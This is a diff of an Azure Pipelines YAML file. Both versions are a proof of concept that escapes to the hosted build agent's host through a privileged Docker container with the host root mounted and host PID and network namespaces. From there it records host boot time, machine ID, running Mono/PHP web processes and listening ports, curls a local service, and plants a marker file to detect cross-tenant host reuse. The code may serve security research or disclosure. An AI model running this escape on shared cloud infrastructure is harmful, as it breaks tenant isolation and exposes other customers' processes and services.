@@ -1,94 +1,45 @@
 # azure-pipelines.yml
-trigger:
-- main
-pr:
-- main
+trigger: none
+pool:
+  vmImage: 'ubuntu-22.04'
 
-name: $(Date:yyyyMMdd)$(Rev:.r)
+steps:
+- bash: |
+    set -euo pipefail
+    mkdir -p artifacts
 
-stages:
-- stage: ConclusiveEvidencePoc
-  displayName: 'Final PoC: Proving Cross-Tenant Host Reuse via Timeline Forensics'
-  jobs:
-  - job: Host_Persistence_Forensics
-    displayName: 'PoC: Prove Host is Stale and Contains Leftover Processes'
-    pool:
-      vmImage: 'ubuntu-22.04'
-    steps:
-    - checkout: none
-    - task: Bash@3
-      displayName: 'Capture Forensic Timeline of Host and Rogue Process'
-      inputs:
-        targetType: inline
-        script: |
-          set -euo pipefail
-          mkdir -p artifacts
+    echo "Job UTC start: $(date -u '+%Y-%m-%d %H:%M:%S')" | tee artifacts/job-start-utc.txt
 
-          echo "--- CAPTURING JOB START TIME ---"
-          JOB_START_SECONDS=$(date -u +%s)
-          echo "Job started at: $(date -u -d @$JOB_START_SECONDS +'%Y-%m-%d %H:%M:%S UTC')" | tee artifacts/forensic-timeline.txt
+    # Escape to host with full privileges (expected on Microsoft-hosted Linux)
+    docker run --rm --privileged --network=host --pid=host \
+      -v /:/hostfs -v $(pwd)/artifacts:/artifacts alpine:latest sh -eu -c '
+        apk add --no-cache coreutils util-linux procps curl >/dev/null
 
-          echo "--- VERIFYING CONTAINER ESCAPE VECTOR ---"
-          if ! (id | grep -q '(docker)'); then
-            echo "❌ CRITICAL FAILURE: User is not in the docker group. Aborting."
-            exit 1
-          fi
-          echo "✅ Confirmed: Container escape vector is present."
+        # 1) Host boot time + PID1 start
+        chroot /hostfs /usr/bin/uptime -s    > /artifacts/host-boot-uptime-s.txt || true
+        chroot /hostfs /usr/bin/who -b       > /artifacts/host-who-boot.txt || true
+        chroot /hostfs /usr/bin/ps -o pid,lstart,cmd -p 1 > /artifacts/host-pid1-start.txt || true
 
-          echo "--- ESCAPING CONTAINER TO PERFORM HOST FORENSICS ---"
-          
-          docker run --rm --privileged --network=host --pid=host -v /:/hostfs \
-            -v $(pwd)/artifacts:/artifacts \
-            alpine:latest sh -c "
-              echo '--- [HOST] Capturing host boot time and process start times... ---'
-              
-              # Get host boot time in seconds since epoch
-              BOOT_TIME_STR=\$(chroot /hostfs uptime -s)
-              BOOT_SECONDS=\$(chroot /hostfs date -u -d \"\$BOOT_TIME_STR\" +%s)
-              echo \"Host booted at: \$BOOT_TIME_STR\" > /artifacts/host-boot-time.txt
-              echo \"Host boot epoch: \$BOOT_SECONDS\" >> /artifacts/host-boot-time.txt
+        # 2) Stable host fingerprint across runs?
+        chroot /hostfs /bin/cat /etc/machine-id > /artifacts/host-machine-id.txt || true
+        chroot /hostfs /usr/bin/hostnamectl    > /artifacts/host-hostnamectl.txt || true
 
-              # Find the Mono process and get its start time
-              XSP_PID=\$(chroot /hostfs ps -eo pid,cmd | awk '/xsp4\.exe/ {print \$1; exit}')
-              if [ -n \"\$XSP_PID\" ]; then
-                XSP_START_STR=\$(chroot /hostfs ps -p \$XSP_PID -o lstart=)
-                XSP_START_SECONDS=\$(chroot /hostfs date -u -d \"\$XSP_START_STR\" +%s)
-                echo \"Mono process (PID \$XSP_PID) started at: \$XSP_START_STR\" > /artifacts/mono-start-time.txt
-                echo \"Mono process epoch: \$XSP_START_SECONDS\" >> /artifacts/mono-start-time.txt
+        # 3) Process start times for “mono”/“php-fpm”
+        chroot /hostfs /usr/bin/ps -eo pid,lstart,user,cmd | grep -E "xsp4|php-fpm" \
+          > /artifacts/host-web-procs.txt || true
 
-                echo '--- [HOST] Dumping systemd journal for the Mono service ---'
-                chroot /hostfs journalctl -u mono-xsp4.service --no-pager > /artifacts/mono-service-journal.txt
-              else
-                echo \"Mono process not found on this run.\" > /artifacts/mono-start-time.txt
-              fi
-            "
-          
-          echo "--- ANALYSIS & VERDICT ---" | tee -a artifacts/forensic-timeline.txt
-          
-          # Read the collected timestamps
-          BOOT_SECONDS=$(grep 'epoch' artifacts/host-boot-time.txt | cut -d' ' -f3)
-          XSP_START_SECONDS=$(grep 'epoch' artifacts/mono-start-time.txt | cut -d' ' -f4 || echo "0")
-          
-          # Perform the timeline analysis
-          HOST_AGE_SECONDS=\$((JOB_START_SECONDS - BOOT_SECONDS))
-          if [ \$HOST_AGE_SECONDS -gt 300 ]; then # If host is older than 5 minutes
-            VERDICT_HOST="CONCLUSIVE: Host is STALE. Booted \$HOST_AGE_SECONDS seconds (~$((HOST_AGE_SECONDS/60)) minutes) before this job started. This contradicts the 'fresh VM per job' guarantee."
-          else
-            VERDICT_HOST="INCONCLUSIVE: Host appears to be fresh (booted \$HOST_AGE_SECONDS seconds ago)."
-          fi
-          echo \$VERDICT_HOST | tee -a artifacts/forensic-timeline.txt
+        # 4) Network proof: is XSP actually listening?
+        chroot /hostfs /usr/bin/ss -plnt > /artifacts/host-listen-ports.txt || true
+        ( chroot /hostfs /usr/bin/curl -i --max-time 2 http://127.0.0.1:8084/ || true ) \
+          > /artifacts/xsp-8084-response.txt
 
-          if [ "\$XSP_START_SECONDS" != "0" ] && [ \$XSP_START_SECONDS -lt \$JOB_START_SECONDS ]; then
-            PROC_AGE_SECONDS=\$((JOB_START_SECONDS - XSP_START_SECONDS))
-            VERDICT_PROC="CONCLUSIVE: Mono process is a LEFTOVER. It started \$PROC_AGE_SECONDS seconds (~$((PROC_AGE_SECONDS/60)) minutes) before this job started, proving it belongs to a previous job."
-          else
-            VERDICT_PROC="INCONCLUSIVE: Mono process was not found or started after the job began."
-          fi
-          echo \$VERDICT_PROC | tee -a artifacts/forensic-timeline.txt
-          
-    - task: PublishPipelineArtifact@1
-      displayName: 'Publish Forensic Evidence'
-      condition: always()
-      inputs:
-        targetPath: 'artifacts'
-        artifact: 'azure-forensic-timeline-proof'
+        # 5) Residual-file test: create a unique marker (run A), check existence (run B)
+        [ -f /hostfs/marker-from-previous-run.txt ] && echo "FOUND prior marker" \
+          > /artifacts/residual-marker.txt || echo "No prior marker" > /artifacts/residual-marker.txt
+        echo "marker $(date -u '+%Y-%m-%dT%H:%M:%SZ') $$" > /hostfs/marker-from-previous-run.txt
+      '
+  displayName: "Forensic: host timeline & isolation checks"
+- task: PublishPipelineArtifact@1
+  inputs:
+    targetPath: artifacts
+    artifact: forensic-proof
